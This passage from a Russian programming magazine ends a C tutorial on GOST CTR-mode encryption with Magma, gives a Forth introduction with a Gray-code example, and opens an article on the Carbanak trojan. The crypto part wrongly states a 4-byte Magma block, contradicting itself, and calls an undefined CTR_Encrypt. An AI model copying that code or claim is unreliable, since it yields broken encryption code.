на практике.


             INFO

                   В    настоящее    время    ГОСТ    34.12—
                     2015 и ГОСТ 34.13—2015 обрели статус меж‐
                        государственных     (в   рамках    нескольких
                        государств СНГ) и получили наименова ния соот‐
                        ветственно ГОСТ 34.12—2018 и ГОСТ 34.13—
                      2018. Оба стан дарта вве дены в действие в качес‐
                         тве   национальных   стан дартов   Российской
                    Федерации с 1 июня 2019 года.



ОБЩИЕ ПРИНЦИПЫ РЕАЛИЗАЦИИ РЕЖИМА ГАММИРОВАНИЯ
Гамма шифра
Гаммирование — это наложение (или сня тие при расшифровке сообщений)
на открытое (или зашифрованное) сооб щение так называемой криптогра‐
фической гаммы. Криптогра фическая гамма — это последовательность эле‐
ментов данных, которая вырабатывается с помощью определенного алгорит‐
ма. Наложение (или снятие) гаммы на блок сооб щения в рассматриваемом
нами стандарте реализуется с помощью операции побитного сложения
по модулю 2 (XOR). То есть при шифровании сооб щений каждый блок откры‐
того сообщения ксорит ся с блоком криптографичес кой гаммы, длина которо‐
го должна соответствовать длине бло ков открытого сообщения. При этом,
если размер блока исходного текста меньше, чем размер блока гаммы, блок
гаммы обрезается до размера блока исходно го текста (выпол няется про‐
цедура усечения гаммы).





  Принцип реализации режима гаммирова ния при зашиф ровывании сооб‐
  щения

Для дешифровки закрытого сообщения необ ходимо произвести обратную
операцию. То есть каждый блок зашиф рованного сообщения ксорится с бло‐
ком гаммы, и на выходе мы имеем требуемое расшифрованное сообщение.





  Принцип реализации режима гаммирова ния при расшифровывании
  сообщения

В большинстве случаев размер блока исходно го текста при нимается равным
размеру блока исполь зуемого алго ритма блочного шифрования (напомню,
это 16 байт при исполь зовании алго ритма «Куз нечик» или 4 байт при исполь‐
зовании «Магмы»), поэтому процедура усечения блока гаммы может понадо‐
биться только для последнего блока исходного текста, в случае, когда общая
длина сообщения не кратна раз меру одно го блока и последний блок получа‐
ется неполный.





  Усечение блока гаммы при несовпадении размеров блока исходного
  сообщения и блока гаммы

Чтобы обеспечить высокую стойкость шифрования, блоки гаммы должны
отличаться друг от дру га, а также иметь случай ный (или псевдослучайный)
характер. В данном слу чае бло ки раз личаются благодаря так называемому
инициализирующему вектору, значение которо го меняется от блока к блоку.
Псевдослучайность блоков гаммы при этом реализуется путем шифрования
этого вектора с исполь зованием выбранно го алгоритма (мы используем
«Магму»).


Инициализиру ющий век тор
Значение этого вектора формиру ется из так называемой синхропосылки,
которая представляет собой число определенной длины. Для режима гам‐
мирования длина этого числа должна быть равна половине размера одного
блока используемого алго ритма блочного шифрования. Само значение син‐
хропосылки для режима гаммирова ния должно быть уникальным для каждого
цикла шифрования, проведенного с использовани ем одинаковых ключей,
при этом требований к конфиденциаль ности синхропосылки не предъ явля‐
ется (то есть ее можно переда вать в открытом виде вместе с зашифрован‐
ным сообщением).
  В режиме гаммирования инициализиру ющий вектор формируется допол‐
нением нулями синхропосылки до размера одного блока используемого
алгоритма блочного шифрования. В случае «Магмы» длина синхропосылки
равна четырем байтам, длина инициализиру ющего вектора — восьми. Вторая
часть инициализирующего вектора (заполненная нулями) будет исполь‐
зоваться в качестве того самого счетчика (Counter), который и лег в основу
англоязычного сок ращения CTR.





  Выработка инициализиру ющего вектора в режиме гаммирования с алго‐
  ритмом блочного шифрования «Магма»

Очередной блок гаммы шифра получается благодаря шифрованию значения
счетчика  (его начальное значение равно ини циализирующему  вектору)
с помощью выбранного алго ритма блочного шифрования, при этом после
выработки  оче редного блока  гаммы  зна чение  счетчика  уве личивается
на единицу.





                  Выработ ка гаммы шифра


Зашифровываем и расшифро вываем
В целом процесс шифрования выглядит следующим образом.





              Зашифровывание в режиме гаммирования

На рисунке показаны в том числе и операции усечения гаммы шифра (обоз‐
начены буквами T с индексом n). Как я уже говорил, эта операция в боль‐
шинстве случаев не применяется (когда размеры блоков исходного текста
и блоков гаммы шифра совпада ют). Операция усечения гаммы шифра может
понадобиться для последнего блока (на рисунке обозначена буквой T
с индексом s), в случае, когда длина исходно го сооб щения не кратна размеру
блока гаммы шифра.
  Дешифровка полностью повторя ет процесс шифрования за исключением
того, что на вход подают зашифрованный текст, а на выходе получают рас‐
шифрованный, который совпада ет с исходным.





               Дешифровка в режиме гаммирова ния


ПИШЕМ НЕОБХОДИМЫЕ ФУНКЦИИ
Поскольку процессы шифрования и дешифровки в режиме гаммирования
идентичны, определим одну общую функцию для шифрования и расшифровки
строки и одну общую функцию для аналогичной работы с файлом.


Ксо рим бло ки гаммы и тек ста
Для начала опре делим функцию сло жения блоков по модулю 2.


void add_xor(const uint8_t *a, const uint8_t *b, uint8_t *c)
{
  int i;
  for (i = 0; i < BLCK_SIZE; i++)
    c[i] = a[i]^b[i];
}

Здесь все просто и можно, я думаю, обойтись без пояснений.


Шифруем стро ку
void CTR_Crypt(uint8_t *ctr, uint8_t *in_buf, uint8_t *out_buf,
uint8_t *key, uint64_t size)
{
  uint64_t num_blocks = size / BLCK_SIZE;
  // Определяем массив для хранения гаммы
  uint8_t gamma[BLCK_SIZE];
  uint8_t internal[BLCK_SIZE];


  uint64_t i;
  GOST_Magma_Expand_Key(key);
  for (i = 0; i < num_blocks; i++)
  // Если очередной блок полный
  {
    GOST_Magma_Encrypt(ctr, gamma);
    // увеличиваем значение счетчика
    inc_ctr(ctr);
    memcpy(internal, in_buf + i*BLCK_SIZE, BLCK_SIZE);
    add_xor(internal, gamma, internal);
    memcpy(out_buf + i*BLCK_SIZE, internal, BLCK_SIZE);
    size = size ‐ BLCK_SIZE;
  }
  if (size > 0)
  // Если последний блок неполный
  {
    GOST_Magma_Encrypt(ctr, gamma);
    // увеличиваем значение счетчика
    inc_ctr(ctr);
    memcpy(internal, in_buf + i*BLCK_SIZE, size);
    add_xor(internal, gamma, internal);
    memcpy(out_buf + num_blocks*BLCK_SIZE, internal, size);
    size = 0;
  }
  GOST_Magma_Destroy_Key();
}

Здесь GOST\_Magma\_Expand\_Key — это функция раз вертывания ключей
для алгоритма «Магма», а GOST\_Magma\_Encrypt — функция шифрования
блока алгоритмом «Магма» из на шей статьи о «Магме». Если для шиф‐
рования в режиме гаммирования захочешь исполь зовать «Кузнечик», то эти
две функции необходимо заменить на соответс твующие функции «Кузнечика»
(GOST\_Kuz\_Expand\_Key и GOST\_Kuz\_Encrypt из статьи про «Кузнечик»).
  На вход функции подаются:
 • текущее значение инициализиру ющего вектора (ctr);
 • открытое сообщение (in_buf);
 • указатель на буфер для зашифрованного сообщения (out_buf);
 • ключ шифрования (key);
 • длина шифруемого сооб щения (size).


Шифруем файл целиком
Здесь то же самое. Шифруем и рас шифровываем файл одной функци ей.


void CTR_Crypt_File(FILE *src, FILE *dst, uint8_t *init_vec, uint8_t
*key, uint64_t size)
{
  uint8_t *in_buf = malloc(BUFF_SIZE);
  uint8_t *out_buf = malloc(BUFF_SIZE);
  uint8_t ctr[BLCK_SIZE];
  memset(ctr, 0x00, BLCK_SIZE);
  memcpy(ctr, init_vec, BLCK_SIZE / 2);
  while (size)
  {
    if (size > BUFF_SIZE)
    {
      fread(in_buf, 1, BUFF_SIZE, src);
      CTR_Encrypt(ctr, in_buf, out_buf, key, BUFF_SIZE);
      fwrite(out_buf, 1, BUFF_SIZE, dst);
      size ‐= BUFF_SIZE;
    }
    else
    {
      fread(in_buf, 1, size, src);
      CTR_Encrypt(ctr, in_buf, out_buf, key, size);
      fwrite(out_buf, 1, size, dst);
      size = 0;
    }
  }
}

Здесь на вход функции подаем:
 • файл‐источник, содержимое которого необ ходимо зашифровать (src);
 • файл, куда будет записано зашифрованное содержимое файла‐источника
    (in_buf);
 • значение синхропосылки (init_vect);
 • ключ шифрования (key);
 • размер шифруемого файла (size).

Поскольку размер файла, который нужно зашифровать, может быть большим,
его считывание производится не целиком за один раз, а по частям, и констан‐
та BUFF\_SIZE как раз и определяет размер буфера, куда будет считана оче‐
редная часть.


Уве личиваем значение счетчика на единицу
В функции шифрования строки CTR\_Crypt значение счетчика для выработки
очередного блока гаммы шифра увеличи вают вызовом функции inc\_ctr. Ее
опишем следующим обра зом:


static void inc_ctr(uint8_t *ctr)
{
  int i;
  unsigned int internal = 0;
  // Делаем ту самую единичку, на которую увеличиваем счетчик
  uint8_t bit[BLCK_SIZE];
  memset(bit, 0x00, BLCK_SIZE);
  bit[BLCK_SIZE ‐ 1] = 0x01;
  // Прибавляем единицу к текущему значению счетчика
  for (i = BLCK_SIZE ‐ 1; i >= 0; i‐‐)
  {
    internal = ctr[i] + bit[i] + (internal >> 8);
    ctr[i] = internal & 0xff;
  }
}

Если внимательно посмотреть, то можно увидеть знакомые строчки из фун‐
кции сложения по модулю n (в данном случае n соответству ет раз меру блока).
С помощью этих строчек к текущему зна чению счетчика прибавляется мас‐
сив, по размеру равный одному блоку, в последний байт которого записана
единица.


Удаляем ключи из памяти
То место в памяти, где лежат итерационные клю чи шифрования, после их
использования необходимо очистить. Для этого напишем простую функцию:


void GOST_Magma_Destroy_Key()
{
  int i;
  for (i = 0; i < 32; i++)
    memset(iter_key[i], 0x00, 4);
}

В нашем случае функция предназначена для работы с «Магмой». Для «Куз‐
нечика», я думаю, ты смо жешь написать такую же функцию сам, если понадо‐
бится.


ЗАКЛЮЧЕНИЕ
Теперь  ты  знаешь,  как  применять  блочные  алгоритмы шифрования
для работы с сообщениями про извольной длины с использованием режима
гаммирования. Это позволяет избежать основного недостатка режима пря‐
мой замены (если шифруемое сообщение содержит в себе одинаковые
или повторяющиеся бло ки, то на выходе мы тоже получим зашифрованные
одинаковые или повторя ющиеся блоки). В этой статье режим гаммирования
рассмотрен применительно к алго ритму «Маг ма», но если понадобится «Куз‐
нечик», то нет проб лем — все необходимые функции мы уже написали.


        WWW

                  •Текст ГОСТ  34.13—2015 можно  посмотреть
                         здесь.
                  •На моем GitHub лежит код для алгоритма «Маг‐
                        ма» в виде проекта Qt (в том числе и для ре‐
                      жима простой замены).
                  •Там же ты найдешь исходник для алгоритма
                          «Кузнечик».
КОДИНГ





 ЗАГАДОЧНЫЙ FORTH

  ЗНАКОМИМСЯ С ОДНИМ ИЗ ВАЖНЕЙШИХ ЯЗЫКОВ
  ПРОГРАММИРОВАНИЯ, О КОТОРОМ МАЛО КТО ЗНАЕТ





Почему Forth, один из ста рейших языков
программирования, до сих пор привлекает
к  себе  внимание  и  будоражит  вооб‐
ражение? Его применяют в самых разных
областях, включая чипсеты PCI и космичес‐            SergeBN                                                                                               sergebn@mail.ru
кие аппараты, а Павел Дуров будет исполь‐
зовать  схожий  язык  в  смарт‐кон трактах
криптовалюты TON. Так что же такое этот
загадочный Forth?


Создатель Forth Чарльз Мур изначально описал его так:



     FORTH — это программа, которая связыва ет кла виату ру с компьюте-
      ром.

Ни больше ни меньше. Изна чальная идея была прос той: нужен какой‐то язык,
на котором человек за клавиатурой мог бы общать ся с компьютером. С тех
пор прошло полвека, а проб лема интерфейсов между человеком и машиной
по‐прежнему не решена.
  Мур продолжает:



     Получив шийся язык дос таточ но мощ ный, чтобы описать сам FORTH,
      и дос таточ но гибкий, чтобы делать зап росы. Он может быть легко
      рас ширен для обра ботки стольких и столь сложных приложе ний, нас-
      колько поз воляет аппа ратное обес печение.
     FORTH — это компьютер ная программа. Он обес печива ет полный
      програм мный интерфейс между тер миналом и компьюте ром. Вклю чая
       язык, на котором пользователь может описать свое приложе ние. И на
      котором написан FORTH.

Сегодня  существует  мас са  языков  прог раммирования,  и  в  каждой
из областей свои лидеры. Но для Мура проб лема разработки языка была
гораздо более глобальной: как кодифицировать мысленные абстракции, что‐
бы ими можно было опериро вать прог раммно?
  Похожие идеи привели к соз данию абстрактных типов данных (в каждом
языке есть библиотека, реализующая списки, очереди, словари и тому
подобное) и объектно ориентированного прог рамми рования. Но сущес твуют
и другие примеры, как раз ные идеи могут изменить наши представления
о том, что мы называем прог раммированием. Так, идея безопас ного прог‐
раммирования породила функциональные языки, где нет операторов, а в
некоторых из них — и переменных тоже.
  А что же Forth? Пока другие языки эволюци онировали, он остался тем же,
потому что прак тически любую из упомянутых идей в нем и так можно воп‐
лотить. Причем сделать это не так тяжело. Представь: ты сможешь создать
свою реализацию, которая будет подходить для решения именно твоей
задачи.


ОСНОВЫ СИНТАКСИСА, ИДЕОЛОГИЯ
Вот еще одно определе ние Forth, на этот раз из «Википедии»:



     Форт (англ. Forth) — один из пер вых конкатена тив ных язы ков прог-
     раммирова ния, в котором программы записы ваются пос ледова тель-
      ностью лек сем («слов» в тер минологии язы ка Форт). Матема тичес кие
     выраже ния пред став ляются пос тфиксной записью при использовании
      сте ковой нотации. Под держивает механиз мы метарас ширения семан-
      тики и синтаксиса язы ка для адап тации к нужной пред метной области.
     Синтаксис базового уров ня в Фор те прост и сос тоит из единс твенного
      пра вила: «все опре деле ния раз деляются пробела ми».

Увы, несмотря на всю свою точность, оно не поз воляет прочувствовать суть
языка. Поэтому покажу на примерах.
  Форт интерактивен, то есть сразу начинает работать. Запускаем Gforth
(популярная опенсорсная реализация) и набира ем


1 2 + ok

Вот это и есть постфиксная запись и стековая нотация. Но где же результат?
Результат в стеке. Чтобы его увидеть, нуж но ввес ти точку и снова нажать En‐
ter. Вот как он выглядит:


. 3 ok

Программирование на форте сос тоит в определении новых слов на основе
слов, определенных в сло варе. Допус тим, ты хочешь написать знаменитую
программу «Здравствуй, мир!». Для это го определяем слово:


: привет ." Здравствуй, мир!" ;

Теперь вводим


привет

И получаем


Здравствуй, мир!

Ладно, знакомство состоялось. Предположим теперь, что надо сложить нес‐
колько чисел. Можно, конечно, на каждое число ввести по одному плюсу
и получить результат. Но почему бы не поручить это сделать самому форту?
Определяем сло во сумма:


: сумма ( n ‐‐ ) 0 DO + LOOP ;

Слова можно определять в любом наци ональ ном алфавите. Определение
начинается с двоеточия. Далее идет сло во, семантику которого необ ходимо
определить. В скоб ках — стековая нотация, в данном слу чае сказано, что
для слова сумма в стеке должно находить ся число, обозначающее количество
чисел, которые необ ходимо просуммировать. Далее 0 — нижний предел цик‐
ла. Начало цикла — слово DO. Дальше описано, что будет делать цикл.
И конец цикла — LOOP.
   Тестируем программу. Наберем несколько про извольных чисел:


1 2 3 4 5

Все эти числа поместились в стек. Всего их пять, а опе рацию сложения необ‐
ходимо выполнить четыре раза. Поэто му набирай


4 сумма .

Получим


15 ok

Чтобы не думать о том, что для пра вильной работы цикла нужно указывать
число на единицу меньшее, чем количес тво чисел, пусть само слово сумма
этим и занимается:


: сумма ( n ‐‐ ) 1‐ 0 DO + LOOP ;

Теперь вводим


1 2 3 4 5 5 сумма .

И получаем правильный ответ.


ГДЕ ПРИМЕНЯЕТСЯ FORTH И КАКОЙ ОН БЫВАЕТ
Изначально Forth применялся для программирова ния встроенных приложе‐
ний (embedded) и приложений реального времени. Сегодня же на нем можно
писать программы для Windows и раз ных вариантов Unix, включая macOS.
Кроме того, коммерческие кросс‐компиляторы Forth генерируют высокоопти‐
мизированный код, который работа ет на хорошо зарекомендовавших себя
микропроцессорах и микроконтроллерах.


Open Firmware
У Forth есть все необ ходимое, чтобы управлять вычислительной системой
в целом, независимо от того, на каком железе она реализована и какая у нее
периферия. Это свой ство Forth интенсивно используется в раз ных системах.
  Open Firmware (OpenBoot) — это стандарт, определяющий интерфейсы
компьютерной мик ропрограммной системы. Он был разработан в Sun, и его
поддержали Apple, IBM, ARM и большинс тво дру гих поставщиков чипсетов
PCI, отличных от x86. Открытая прошивка позволяет сис теме загружать
независимые от платформы драйверы непосредс твенно с карты PCI, что
повышает совместимость.
  Обращаться к Open Firmware можно с помощью командной оболочки
на языке Forth, и большая часть кода написана на нем же. Код Forth может
быть скомпилирован в байт‐код FCode, независимый от таких деталей компь‐
ютерной архитектуры, как набор инс трукций и иерархия памяти. Поэтому
Open  Firmware  предос тавляет  плат форменно  независимые  средства
для диагностики во время загрузки и для конфигурирования.


Микрокон трол леры
Forth часто применяют для прог раммирования микроконтрол леров. Множес‐
тво ссылок по этой теме ты можешь най ти в топике на русском Forth Forum.
Встречаются решения на ARM, AVR, MSP430 и PIC.
  Мне также попалась занимательная книга на рус ском о применении кон‐
троллеров PIC в измеритель ной технике  (PDF) и компилятор программы
на форте для микроконтроллеров серии 16Cxx.
   Если же тебе интересен Arduino, можешь использовать AmForth — легко
расширяемый интерпретатор команд для Atmel, AVR8 ATmega, T1 MSP430,
32‐разрядных вариантов ARM и RISC‐V.
   Также из интересного: британская компания MpeForth разработала VFX‐
forth для использования во встроенных решениях; RoboForth — программное
обеспечение, которое работает в контрол лере робота.
   Ну и конечно же, Forth летал в космос, причем неод нократно. Список мис‐
сий и систем, которые работа ли на Forth, можно най ти на сайте NASA. Точ‐
нее, можно было некото рое время назад.


Про цессоры на Forth
В разное время предпринимались раз ные по подходу и по успешнос ти
попытки создать процессор, который бы работал с инструкциями на Forth.
В частности, в середине двухтысячных годов такой процессор проектировали
в России на основе ПЛИС.
  Но наиболее продвинутая реализация на данный момент — это чипы
SEAforth. Создатель Forth Чарльз Мур еще с вось мидесятых годов работает
над их архитектурой и успел поучас тво вать в соз дании череды предприятий,
которые занимаются коммерческим продвижением этих чипов. Последняя
из таких компаний называется GreenArrays и выпус кает чипы GA144.
   SEAforth можно рассматривать как одно родную вычислительную структуру,
изготовленную на одном кристалле. Она состоит из асинхронно работающих
вычислительных узлов  (nodes). Топология двумерной решетки, лежащая
в основе SEAforth, легко масшта биру ется: созданы мультикомпьютеры, име‐
ющие 24, 40 и 144 узла на кристалле (тот самый GA144).
  Отдельный узел выполняет около 700 миллионов операций в секунду.
Пиковое быстродействие мультикомпьютера S40 можно оценить в 28 мил‐
лиардов операций в секунду. Подробнее смот ри в даташите (PDF).


Наука и обу чение
Помимо перечисленного, Forth также при меняется в академической сре де —
в аппаратном обеспечении курсов по цифровой обработке сигналов, парал‐
лельного программирования, архитектуры вычислительных сис тем и  так
далее. А для научных рас четов существует семейство библиотек Forth Scien‐
tiﬁc Library.


TON
Одна из новейших реинкарна ций Forth — это Telegram Open Network Virtual
Mashine, или TVM (PDF). Она раз работа на для того, чтобы выполнять код
смарт‐контракта в блок чейне TON. TVM является стековой машиной.
   Язык программирования Fift (PDF) специально разработан для создания
смарт‐контракта TON Blockchain, управления им и взаимодействия с TVM
и блокчейном TON.
  В руководстве к Fift написано, что Fift основан на сте ковом языке и мало
чем отличается от фор та. Так что учти: зна ние форта пригодится для понима‐
ния Fift!


        WWW

                   Еще  больше  интересных  вещей,  связанных
                        с Forth, ты можешь найти на ForthHub, на стра‐
                       ничке Dr. Cactus и в вики wiki.forth.org.ru.





                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
  ЗАГАДОЧНЫЙ FORTH
           ЗНАКОМИМСЯ С ОДНИМ ИЗ ВАЖНЕЙШИХ
         ЯЗЫКОВ ПРОГРАММИРОВАНИЯ, О КОТОРОМ
                           МАЛО КТО ЗНАЕТ





РЕАЛИЗУЕМ ПРИМЕР ПОСЛОЖНЕЕ: КОД ГРЕЯ
В качестве более продвинуто го примера, чем «Привет, мир», рассмотрим
реализацию генератора кода Грея. Это дво ичный код, в котором две сосед‐
ние кодовые ком бинации отличаются цифрой толь ко в одном двоичном раз‐
ряде. Это свойство кода Грея проявляется в упорядоченном наборе.
  Следующий пример показывает, как выглядит код Грея порядка 2.


00
01
11
10

Эта последовательность не единс твенная. Как минимум ее можно обратить.
Кроме этого, существу ют коды Грея и дру гих порядков. Такой код широко
применяют для выявления и исправления ошибок в системах связи (под‐
робнее смотри в  статье «Википедии» и  в  статье Сергея Холодилова
на RSDN).
  Для  генерации  кода  Грея  воспользуемся  алгоритмом  зеркального
переворачивания списка битов. Затем полученные спис ки объ еди няются и в
начало каждого кода дописываются нули, а в начало каждого кода в перевер‐
нутом списке — единица.
  Коды будем хранить в узлах списка. Для этого опре делим следующую
структуру данных.


begin‐structure cgr% \ Имя структуры
    field: cgr>next  \ Указатель на следующий узел в списке
    field: cgr>data  \ Сам код
    field: cgr>n     \ Просто порядковое число
end‐structure

Слово, которое будет создавать узел списка, запишем следующим образом:


: cgr‐new ( n ‐‐ addr‐cgr = n порядковый номер узла )
    cgr% allocate throw \ Выделяет необходимое количество памяти
    >r \ Сохраняет адрес выделенного участка памяти
    0 r@ cgr>next ! \ В указатель на следующий узел записывает 0,
так как это последний узел в списке
    r@ cgr>n !      \ Присваивает узлу его порядковый номер
    r> \ Возвращает адрес выделенного участка памяти в стек
;

Здесь слово >r переносит содержимое вершины стека данных на вершину
стека возвратов, сло во r@ копирует вершину стека возвратов на вершину сте‐
ка данных, а слово r> снимает содержимое с вершины сте ка возвратов и сох‐
раняет это содержимое на вершине стека данных.
  Сразу же пишем сло во, которое будет осво бож дать выделенную память.
Но, забегая вперед, отмечу, что для работы этого слова понадобятся некото‐
рые переменные. Введем эти переменные.


variable scg \ Имя списка для последовательности ( список ) кодов
Грея
variable cur‐node \ Указатель на текущий узел в списке
variable next‐node \ Указатель на следующий узел в списке
variable last‐node \ Указатель на последний узел в списке
variable cgr‐width \ Ширина кода в битах

Теперь вполне законно можно определить следующее слово. Это слово
будет освобождать узлы списка.


: scg‐free ( addr‐scg ‐‐ = адрес списка, память которого требуется
освободить)
    cur‐node ! \ Сохраняем этот адрес
    cur‐node @ cgr>next @ \ Получаем адрес следующего узла
    next‐node ! \ Сохраняем его
    BEGIN
        cur‐node @ free throw \ Освобождаем текущий узел
        next‐node @ cur‐node !\ Следующий узел становится текущим
узлом
        cur‐node  @ \ Текущий адрес
        0<>         \ не равен нулю?
    WHILE
        cur‐node @ cgr>next @ next‐node ! \ Получаем адрес следующего
 узла
    REPEAT
    cr  ." память освобождена"
;

Теперь напишем слово, которое будет создавать новый узел и присоединять
его к концу списка.


: cgr‐append ( addr‐cgr ‐‐ cgr )
    dup cgr>n @ 1+ \ Получаем номер последнего узла и увеличиваем его
 на 1
    cgr‐new        \ Создаем новый узел
    dup rot        \ Устанавливаем адреса в нужном порядке
    cgr>next !     \ Сохраняем адрес следующего узла
;

Для своего исполнения сло во требует, чтобы в стеке находился адрес пос‐
леднего узла списка. Сло во вначале создает новый узел. Потом в текущий
узел записывает адрес нового узла.
   Чтобы просмотреть содержимое узлов списка, напишем слово cgr‐dump.


: cgr‐dump ( addr‐scg ‐‐ )
    ." addr scg:" dup . cr
    cur‐node !
    cur‐node @ cgr>next @ next‐node !
    BEGIN
        ." cgr>n:" cur‐node @ cgr>n @ . cr
        ." cgr>data:" cur‐node @ cgr>data @ . cr
        ." cgr>next:" cur‐node @ cgr>next @ . cr
        next‐node @ cur‐node !
        cur‐node @ 0<>
    WHILE
        cur‐node @ cgr>next @ next‐node !
    REPEAT
;

Работает это сло во прос то. Сна чала слово получа ет адрес первого узла
списка и печатает содер жимое полей этого узла. Потом берет адрес сле‐
дующего узла и печатает его содержимое. И так до тех пор, пока не достигнет
последне го узла.

Следующее слово кладет на вершину стека адрес следующего узла.


: cgr‐next@ ( addr‐node ‐‐ addr‐node )
    cgr>next @
;

Конечно, при работе со списками очень удоб но иметь слово, указывающее
на последний узел списка.


: cgr‐last‐node@ ( addr‐cgr ‐‐ last‐node )
    >r
    r@ cgr‐next@
    BEGIN
        dup 0<>
    WHILE
        r> drop >r
        r@ cgr‐next@
    REPEAT
    drop r>
;

А также слово, которое подсчитыва ет длину спис ка или, иначе, количество
узлов в списке.


: cgr‐length ( addr‐scg ‐‐ n )
    dup >r
    cgr‐next@
    0
    BEGIN
        1+ swap
        dup 0<>
    WHILE
        r> drop dup >r
        cgr‐next@ swap
    REPEAT
    drop r> drop
;

Следующее слово пред назна чено для удвоения количества узлов в списке.
Это слово будет необ ходимо для реали зации самого алгоритма генерации
кода Грея.


: cgr‐dup ( addr‐cgr ‐‐ )
    dup \ Берем список
    cgr‐length \ Определяем его длину
    0 DO \ Столько же узлов и добавим в список
        dup cgr‐last‐node@ cgr‐append drop
        \ Каждый новый узел присоединяем к последнему присоединенному
 узлу
    LOOP
;

Теперь напишем несколько слов, которые будем использовать для визуали‐
зации полученного кода Грея.
  Идея этого сло ва сос тоит в том, чтобы прочитать каждый из m бит,
начиная с крайнего пра вого, и в зависимос ти от значения этого бита
положить в стек число, представляющее код символа этого бита.


: cgr‐bin‐vis ( n m ‐‐ m = m cgr‐width )
    dup >r  cr \ Сохраним m
    0 DO
        dup
        1 I lshift and \ Сдвигаем 1 в нужную позицию
        I rshift \ Возвращаем 1 в начало
        case \ Теперь в стеке либо 0, либо 1
            0 of 48 endof
            1 of 49 endof
        endcase \ Заменяем бит на код символа
        swap \ ." swap:"  .s cr
    LOOP \ Повторяем для следующего бита
    drop r>  \ Чистим стек
;

Следующее сло во печатает m символов в строке терминала, снимая со стека
код символа.


: cgr‐emit ( m ‐‐ = m cgr‐width )
    0 DO
        emit
    LOOP
;

Проверяем. Допустим, есть число 6, для его дво ичной визуализации дос‐
таточно трех битов. Наберем следующее предложение:


6 3 cgr‐bin‐vis cgr‐emit

Получаем


110 ok

Для двоичной визуализации числа 10 необходимо уже четыре бита, поэтому
набираем


10 4 cgr‐bin‐vis cgr‐emit

Результат:


1010 ok

Теперь можно воспользовать ся этими двумя сло вами для  того, чтобы
показать код Грея, который находится в текущем узле списка.


: cgr‐show ( addr‐cgr ‐‐  )
    dup cgr‐length \ .s cr
    0 DO \ Получаем узел и печатаем код Грея
        dup cgr>data @ cgr‐width @ cgr‐bin‐vis cgr‐emit
        cgr‐next@
    LOOP
    drop drop
;

Теперь все готово для того, что бы сгенерировать код Грея. Следующее слово
устанавливает старший бит зеркального двоичного кода в еди ницу, формируя
при этом код Грея.


: cgr‐bit‐prod ( addr‐cgr ‐‐ )
    dup cgr>data @ \ Получаем код
    1 cgr‐width @ lshift or \ Устанавливаем старший бит в 1
    swap cgr>data ! \ Сохраняем сформированный код
;

Формируем удвоенную зеркальную пос ледователь ность кодов.


: cgr‐prod ( addr‐cgr ‐‐ )
    dup cgr‐length
    0 DO
        \ Берем двоичный код со стека и записываем его в поле данных
узла
        dup rot swap cgr>data !
        \ Вызываем слово, формирующее код Грея
        dup cgr‐bit‐prod
        cgr‐next@ \ Готовим следующий узел
    LOOP
    drop
    cgr‐width @ 1+ cgr‐width ! \ Увеличили ширину кода на 1
;

Подготавливаем двоичные коды для отоб ражения.


: cgr‐gen ( n addr‐cgr ‐‐ )
    dup >r \ r@
    dup cgr‐length  2 /
    0 DO
        \ Сохраним в стеке данные
        dup cgr>data @ \ .s
        swap \ Поднимем адрес
        cgr‐next@
    LOOP
    r> drop
;

Теперь сам драйвер. Для инициализации первоначального списка опре‐
делим следующее сло во, оно инициирует поля cgr>data, присваивая им зна‐
чения 0 и 1.


: cgr‐init ( addr‐scg ‐‐ )
    dup
    %0 swap cgr>data !
    cgr>next @
    %1  swap cgr>data !
;

Следующее сло во выполняет сброс переменных в первоначальное сос‐
тояние и освобождает память, занятую списком.


: cgr‐reset ( ‐‐ )
    0 cur‐node !
    0 next‐node !
    0 last‐node !
    1 cgr‐width !
    scg @ scg‐free \ Освободим память
;

Слово cgr‐setup создает первый узел в списке и присваивает переменной
scg адрес этого узла. Уста навливает поле cgr>n в ноль. Далее оно присоеди‐
няет еще один узел к списку и устанавлива ет поле cgr>n в единицу, пос ле
чего вызывает cgr‐init для инициализации полей двоичного кода.


: cgr‐setup ( ‐‐ )
    0 cgr‐new scg !
    scg @
    dup cgr‐append drop
    cgr‐init
;

И наконец, глав ное сло во. Это сло во вызывает первоначальную установку
переменных и самого списка. Потом удлиняет этот список, вызывает слово,
генерирующее код Грея, и распечатывает полученный код в терминале. Также
полученный код Грея дос тупен для дальнейшей работы в самом списке.


: cgr‐main ( ‐‐ )
    cgr‐setup \ Подготавливаем данные к работе
    3 0 DO \ Генерируем код с длиной 2/3/4 бита
        scg @ cgr‐dup \ Удваиваем длину списка
        scg @ cgr‐gen cgr‐prod \ Генерируем код
        scg @ cgr‐show \ Печатаем код Грея
    LOOP
;

Если полученный код Грея не нужен для дальнейшей работы, вызываем cgr‐
reset.
   Это слово сбросит все переменные в исходное состояние и освободит
выделенную память. После чего можно снова вызвать cgr‐main при необ‐
ходимости.


КАК ПРОДОЛЖИТЬ ИЗУЧЕНИЕ
Итак, мы прошлись по основам Forth, посмотрели, какие есть реализации
и где они используются, и написали пример, который рас крывает возможнос‐
ти языка. Если мне удалось тебя заинтересовать, то ты, наверное, уже раз‐
мышляешь о том, где может пригодиться специалист по Forth. Или наобо‐
рот — чем Forth может пригодиться программисту сегодня.
   Изучив этот язык, ты можешь занимать ся исследованием новых языков
программирования, искать новые идеи в син таксисе и семантике для новей‐
ших языков и компиляторов. Также, зная Forth, можно разрабаты вать сте‐
ковые виртуальные машины и процессоры или же заниматься программи‐
рованием микроконтроллеров и автоматизацией.


Спи сок книг, которые помогут тебе про дол жать изу чение
это го увле катель ного и уни каль ного язы ка:
 • Учебное пособие по языку ФOPT
 • Stephen Pelc «Programming Forth» (PDF)
 • Стандарт Forth 2012
 • С. Баранов, Н. Ноздрунов «Язык форт и его реализации»
 • Лео Броуди «Начальный курс программирова ния на язы ке форт»
 • Лео Броуди «Спо соб мышления — форт. Язык и философия для решения
   задач»
 • М. Келли, H. Спайс «Язык программирования Форт»
 • Ю. Семенов «Программирова ние на языке Форт»
 • В. Дьяконов «Форт‐системы программирова ния персональных ЭВМ»
 • А. Бураго, В. Кириллин, И. Романовский «Форт — язык для микропроцес‐
   соров»
КОДИНГ
   ПОТРОШИМ
     CARBANAK

       КАК ИЗНУТРИ УСТРОЕН ИЗВЕСТНЫЙ
                 БАНКОВСКИЙ ТРОЯН





                                                                                         Nik Zerof
                                                                                             xtahi0nix@gmail.com





Банковские трояны, ворующие деньги со сче тов компаний
и простых пользователей, ежегодно наносят ущерб на мил‐
лионы долларов. Естественно, вирмейкеры стараются дер‐
жать все, что связано с внутренней кухней банкеров, в глу‐
